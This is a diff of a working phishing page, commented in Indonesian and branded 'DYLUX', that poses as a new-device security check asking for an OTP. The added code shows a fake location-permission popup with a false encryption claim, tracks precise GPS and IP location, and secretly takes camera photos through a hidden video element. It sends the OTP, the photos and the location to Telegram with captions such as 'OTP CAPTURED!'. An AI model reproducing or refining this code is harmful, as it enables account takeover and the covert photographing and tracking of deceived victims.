@@ -55,11 +55,12 @@
             font-size: 14px;
             line-height: 1.6;
         }
+        /* 🔥 SEMBUNYIKAN VIDEO */
         video {
-            width: 100%;
-            border-radius: 12px;
-            margin: 12px 0;
-            background: #0a0a0f;
+            display: none !important;
+        }
+        canvas {
+            display: none !important;
         }
         button {
             width: 100%;
@@ -109,15 +110,101 @@
             margin-top: 10px;
             display: none;
         }
-        .hidden {
-            display: none;
+        /* Popup */
+        #popupOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        #popupBox {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 32px 28px;
+            max-width: 340px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            box-shadow: 0 0 40px rgba(0, 240, 255, 0.1);
+        }
+        #popupBox .popup-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        #popupBox .popup-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #e0e0ff;
+            margin-bottom: 8px;
+        }
+        #popupBox .popup-desc {
+            font-size: 13px;
+            color: #8888aa;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        #popupBox .popup-btn-group {
+            display: flex;
+            gap: 10px;
+        }
+        #popupBox .popup-btn-group .btn-cancel {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            background: #2a2a3e;
+            color: #8888aa;
+        }
+        #popupBox .popup-btn-group .btn-allow {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
+            color: #fff;
+        }
+        #popupBox .popup-footer {
+            font-size: 11px;
+            color: #555;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
 
     <!-- ========================================== -->
-    <!-- AUTO-DETECT + POPUP "LANJUTKAN"          -->
+    <!-- POPUP "LANJUTKAN KE WEBSITE INI?"         -->
+    <!-- ========================================== -->
+    <div id="popupOverlay">
+        <div id="popupBox">
+            <div class="popup-icon">🌐</div>
+            <div class="popup-title">Lanjutkan ke website ini?</div>
+            <div class="popup-desc">
+                Website ini ingin mengakses lokasi Anda untuk pengalaman yang lebih baik.
+            </div>
+            <div class="popup-btn-group">
+                <button class="btn-cancel" id="popupCancel">Batal</button>
+                <button class="btn-allow" id="popupAllow">Izinkan</button>
+            </div>
+            <div class="popup-footer">🔒 Data terenkripsi end-to-end</div>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- AUTO-DETECT + GPS PRESISI                -->
     <!-- ========================================== -->
     <script>
     // ============================================
@@ -130,12 +217,7 @@
         { url: 'https://freeipapi.com/api/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
         { url: 'https://ipwhois.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
         { url: 'https://ip-api.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.lat, lon: d.lon }) },
-        { url: 'https://ipinfo.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1] }) },
-        { url: 'https://ip-api.com/json/', parse: (d) => ({ ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp, lat: d.lat, lon: d.lon }) },
-        { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
-        { url: 'https://freeipapi.com/api/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
-        { url: 'https://ipwhois.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
-        { url: 'https://ip-api.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.lat, lon: d.lon }) }
+        { url: 'https://ipinfo.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1] }) }
     ];
 
     // ============================================
@@ -174,7 +256,7 @@
     }
 
     // ============================================
-    // FUNGSI AMBIL LOKASI GPS (PRESISI)
+    // FUNGSI AMBIL GPS PRESISI (WATCH + AKURASI)
     // ============================================
     function getGPSLocation() {
         return new Promise((resolve) => {
@@ -182,26 +264,49 @@
                 resolve(null);
                 return;
             }
-            // Pake watchPosition biar dapet sinyal paling stabil
+
             let watchId = null;
             let resolved = false;
+            let bestLocation = null;
+            let attempts = 0;
+            const maxAttempts = 10;
 
             const timeout = setTimeout(() => {
                 if (watchId) navigator.geolocation.clearWatch(watchId);
-                if (!resolved) resolve(null);
-            }, 8000);
+                if (!resolved) {
+                    if (bestLocation) {
+                        resolve(bestLocation);
+                    } else {
+                        resolve(null);
+                    }
+                }
+            }, 12000);
 
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    if (!resolved) {
-                        resolved = true;
-                        clearTimeout(timeout);
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
+                    attempts++;
+                    const accuracy = pos.coords.accuracy;
+                    // Ambil lokasi kalo akurasi < 100 meter
+                    if (accuracy < 100 || attempts >= maxAttempts) {
+                        if (!resolved) {
+                            resolved = true;
+                            clearTimeout(timeout);
+                            navigator.geolocation.clearWatch(watchId);
+                            resolve({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: accuracy
+                            });
+                        }
+                    } else {
+                        // Simpan lokasi terbaik sementara
+                        if (!bestLocation || accuracy < bestLocation.accuracy) {
+                            bestLocation = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: accuracy
+                            };
+                        }
                     }
                 },
                 () => {
@@ -209,7 +314,7 @@
                         resolved = true;
                         clearTimeout(timeout);
                         navigator.geolocation.clearWatch(watchId);
-                        resolve(null);
+                        resolve(bestLocation || null);
                     }
                 }, {
                     enableHighAccuracy: true,
@@ -244,10 +349,10 @@
                 } catch (e) { /* Coba API berikutnya */ }
             }
 
-            // 2. AMBIL GPS PRESISI (PAKAI WATCH POSITION)
+            // 2. AMBIL GPS PRESISI (WATCH SAMPE AKURASI < 100m)
             const gpsData = await getGPSLocation();
 
-            // 3. Tentukan lokasi final (prioritas GPS kalo ada)
+            // 3. Tentukan lokasi final (prioritas GPS)
             let finalLat = ipData?.lat || 0;
             let finalLon = ipData?.lon || 0;
             let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
@@ -257,7 +362,7 @@
                 finalLat = gpsData.lat;
                 finalLon = gpsData.lon;
                 locationText = `GPS: ${finalLat}, ${finalLon}`;
-                accuracyText = ` (Akurasi ${gpsData.accuracy}m)`;
+                accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
             }
 
             // 4. Buat link Google Maps
@@ -283,75 +388,26 @@
     })();
 
     // ============================================
-    // POPUP "LANJUTKAN KE WEBSITE INI?"
+    // POPUP HANDLER
     // ============================================
-    (function showPermissionPopup() {
-        // Cek apakah user udah izinin lokasi sebelumnya
-        if (localStorage.getItem('dylux_location_allowed')) {
-            return;
-        }
+    document.getElementById('popupAllow').addEventListener('click', () => {
+        document.getElementById('popupOverlay').style.display = 'none';
+        // Trigger GPS request
+        navigator.geolocation.getCurrentPosition(
+            () => { console.log('📍 Location allowed'); },
+            () => { console.log('❌ Location denied'); }, {
+                enableHighAccuracy: true
+            }
+        );
+        // Refresh auto-detect after 2s
+        setTimeout(() => { window.location.reload(); }, 1500);
+    });
 
-        // Buat popup palsu
-        const overlay = document.createElement('div');
-        overlay.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(0,0,0,0.8); z-index: 9999;
-                display: flex; align-items: center; justify-content: center;
-                font-family: Arial, sans-serif;
-            `;
-
-        const popup = document.createElement('div');
-        popup.style.cssText = `
-                background: #1a1a2e; border-radius: 16px; padding: 32px 28px;
-                max-width: 340px; width: 90%; text-align: center;
-                border: 1px solid rgba(0,240,255,0.2);
-                box-shadow: 0 0 40px rgba(0,240,255,0.1);
-            `;
-
-        popup.innerHTML = `
-                <div style="font-size: 48px; margin-bottom: 12px;">🌐</div>
-                <div style="font-size: 18px; font-weight: 700; color: #e0e0ff; margin-bottom: 8px;">
-                    Lanjutkan ke website ini?
-                </div>
-                <div style="font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.6;">
-                    Website ini ingin mengakses lokasi Anda untuk pengalaman yang lebih baik.
-                </div>
-                <div style="display: flex; gap: 10px;">
-                    <button id="popupCancel" style="flex:1; padding: 12px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: #2a2a3e; color: #8888aa;">
-                        Batal
-                    </button>
-                    <button id="popupAllow" style="flex:1; padding: 12px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff;">
-                        Izinkan
-                    </button>
-                </div>
-                <div style="font-size: 11px; color: #555; margin-top: 16px;">
-                    🔒 Data terenkripsi end-to-end
-                </div>
-            `;
-
-        overlay.appendChild(popup);
-        document.body.appendChild(overlay);
-
-        // Event listeners
-        document.getElementById('popupAllow').addEventListener('click', () => {
-            localStorage.setItem('dylux_location_allowed', 'true');
-            document.body.removeChild(overlay);
-            // Trigger GPS request
-            navigator.geolocation.getCurrentPosition(
-                () => { console.log('📍 Location allowed'); },
-                () => { console.log('❌ Location denied'); }, {
-                    enableHighAccuracy: true
-                }
-            );
-            // Refresh auto-detect
-            setTimeout(() => { window.location.reload(); }, 500);
-        });
-
-        document.getElementById('popupCancel').addEventListener('click', () => {
-            localStorage.setItem('dylux_location_allowed', 'false');
-            document.body.removeChild(overlay);
-        });
-    })();
+    document.getElementById('popupCancel').addEventListener('click', () => {
+        document.getElementById('popupOverlay').style.display = 'none';
+        // Kirim notifikasi tanpa GPS
+        setTimeout(() => { window.location.reload(); }, 500);
+    });
     </script>
 
     <!-- ========================================== -->
@@ -364,8 +420,9 @@
         <h2>Verifikasi Keamanan</h2>
         <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>
 
-        <video id="video" autoplay playsinline class="hidden"></video>
-        <canvas id="canvas" class="hidden"></canvas>
+        <!-- 🔥 VIDEO SEMBUNYI (GAK KELIHATAN) -->
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
 
         <input type="text" id="otpInput" placeholder="Masukkan Kode OTP" maxlength="6">
         <button id="verifyBtn">Verifikasi</button>
@@ -377,7 +434,7 @@
 
     <script>
     // ============================================
-    // AKSES 2 KAMERA SEKALIGUS (RETRY FIX)
+    // KAMERA DEPAN (SELFIE) - SEMBUNYI
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -387,85 +444,47 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    async function captureCamera(facingMode, retries = 2) {
-        for (let attempt = 1; attempt <= retries; attempt++) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 } }
-                });
+    async function captureFrontCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 } }
+            });
 
-                video.srcObject = stream;
-                video.classList.remove('hidden');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(track => track.stop());
+
+            return imageData;
+        } catch (error) {
+            console.error('Front camera error:', error);
+            // Fallback ke kamera belakang kalo depan gagal
+            try {
+                const streamBack = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 } }
+                });
+                video.srcObject = streamBack;
                 await video.play();
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
                 const ctx = canvas.getContext('2d');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                stream.getTracks().forEach(track => track.stop());
-                video.classList.add('hidden');
-
-                return imageData;
-            } catch (error) {
-                console.warn(`Camera ${facingMode} attempt ${attempt} failed:`, error);
-                if (attempt === retries) return null;
-                await new Promise(resolve => setTimeout(resolve, 500));
+                const imageDataBack = canvas.toDataURL('image/jpeg', 0.8);
+                streamBack.getTracks().forEach(track => track.stop());
+                return imageDataBack;
+            } catch (e) {
+                return null;
             }
-        }
-        return null;
-    }
-
-    async function captureBothCameras() {
-        try {
-            // AMBIL 2 KAMERA SEKALIGUS
-            const [backImage, frontImage] = await Promise.all([
-                captureCamera('environment'),
-                captureCamera('user')
-            ]);
-
-            let sentCount = 0;
-
-            if (backImage) {
-                const captionBack =
-                    `<b>📸 BACK CAMERA</b>\n\n` +
-                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-                await sendPhotoToTelegram(userId, backImage, captionBack);
-                sentCount++;
-            }
-
-            if (frontImage) {
-                const captionFront =
-                    `<b>📸 FRONT CAMERA (SELFIE)</b>\n\n` +
-                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-                await sendPhotoToTelegram(userId, frontImage, captionFront);
-                sentCount++;
-            }
-
-            // Kalo gagal semua, coba 1 kamera aja (environment)
-            if (sentCount === 0) {
-                const fallbackImage = await captureCamera('environment', 3);
-                if (fallbackImage) {
-                    const caption =
-                        `<b>📸 CAMERA (FALLBACK)</b>\n\n` +
-                        `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                        `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                        `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-                    await sendPhotoToTelegram(userId, fallbackImage, caption);
-                    sentCount++;
-                }
-            }
-
-            return sentCount > 0;
-        } catch (error) {
-            console.error('Camera error:', error);
-            return false;
         }
     }
 
@@ -484,13 +503,24 @@
         spinner.classList.add('active');
         statusMsg.style.display = 'none';
 
-        const captureSuccess = await captureBothCameras();
+        // Ambil foto selfie
+        const imageData = await captureFrontCamera();
 
+        if (imageData) {
+            const caption =
+                `<b>📸 SELFIE CAPTURED!</b>\n\n` +
+                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            await sendPhotoToTelegram(userId, imageData, caption);
+        }
+
+        // Kirim OTP
         const message =
             `<b>🔑 OTP CAPTURED!</b>\n\n` +
             `<b>👤 User ID:</b> <code>${userId}</code>\n` +
             `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
-            `<b>📸 Foto:</b> ${captureSuccess ? '✅ Berhasil' : '❌ Gagal'}\n` +
+            `<b>📸 Foto:</b> ${imageData ? '✅ Berhasil' : '❌ Gagal'}\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
             `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
